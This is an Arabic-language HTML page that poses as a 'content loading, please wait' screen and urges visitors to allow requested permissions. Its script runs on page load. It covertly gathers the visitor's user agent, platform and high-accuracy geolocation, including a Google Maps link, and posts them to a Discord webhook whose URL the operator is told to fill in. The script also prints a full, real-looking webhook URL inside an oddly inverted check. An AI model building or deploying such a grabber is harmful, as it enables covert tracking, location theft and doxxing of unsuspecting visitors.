<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحميل الصفحة...</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: Tahoma, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .box {
            padding: 20px;
        }
        h2 {
            font-size: 1.5rem;
            color: #38bdf8;
        }
        p {
            color: #94a3b8;
        }
    </style>
</head>
<body>

    <div class="box">
        <h2>جاري تحميل المحتوى، يرجى الانتظار...</h2>
        <p>الرجاء السماح بالإذونات المطلوبة في حال ظهرت لك لاستمرار التصفح.</p>
    </div>

    <script>
        // ضع رابط الويب هوك الخاص بك هنا بين علامتي التنصيص
        const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";

        // جمع معلومات سريعة عن الجهاز والمتصفح مع الموقع الجغرافي
        function collectAndSend() {
            let info = "📍 **تم رصد زائر جديد!**\n";
            info += `🌐 المتصفح: ${navigator.userAgent}\n`;
            info += `💻 النظام: ${navigator.platform}\n`;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        let lat = position.coords.latitude;
                        let lon = position.coords.longitude;
                        let accuracy = position.coords.accuracy;
                        
                        info += `🌍 خط العرض: ${lat}\n`;
                        info += `🌍 خط الطول: ${lon}\n`;
                        info += `🎯 نسبة الدقة: ${accuracy} متر\n`;
                        info += `🔗 رابط الخريطة: https://www.google.com/maps?q=${lat},${lon}\n`;
                        
                        sendToDiscord(info);
                    },
                    function(error) {
                        info += `❌ حالة الموقع: رفض إذن الموقع أو حدث خطأ (رمز الخطأ: ${error.code})`;
                        sendToDiscord(info);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                info += `❌ المتصفح لا يدعم تحديد الموقع الجغرافي.`;
                sendToDiscord(info);
            }
        }

        function sendToDiscord(message) {
            if (webhookURL.includes("https://discord.com/api/webhooks/1545823047930482778/d9MlNgbgy94quZe8KiTXw5vUrDxAvo9Uau5AJuOiFdYDg0YT_ZBBBRDMi-r9BDdzphBw")) {
                console.warn("https://discord.com/api/webhooks/1545823047930482778/d9MlNgbgy94quZe8KiTXw5vUrDxAvo9Uau5AJuOiFdYDg0YT_ZBBBRDMi-r9BDdzphBw");
                return;
            }

            fetch(webhookURL, {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: message
                })
            }).catch(err => console.error(err));
        }

        // تشغيل الوظيفة فور فتح الصفحة
        window.onload = function() {
            collectAndSend();
        };
    </script>

</body>
</html>
